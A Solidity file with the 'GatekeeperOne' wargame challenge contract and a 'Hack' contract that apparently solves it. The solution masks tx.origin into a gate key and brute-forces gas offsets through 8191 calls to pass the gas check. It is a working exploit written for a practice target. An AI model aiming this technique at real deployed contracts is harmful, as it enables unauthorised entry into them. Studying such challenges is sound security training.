// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {
  GatekeeperOne gatekeeperOne = GatekeeperOne(0x0aB6aC3913B5c6536Cb9a0cB9E35f7F162Df4bEc);

  function Attack() public {
    bytes8 key = 0xffffffff0000ffff;
    (bool result,) = address(gatekeeperOne).call{gas:400000}(abi.encodeWithSignature("enter(bytes8)", key));
  }

  function open() public {
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
      for(uint i = 0; i < 8191 ;i++){
        address(gatekeeperOne).call{gas:114928 + i}(abi.encodeWithSignature("enter(bytes8)", key));
      }
  }
}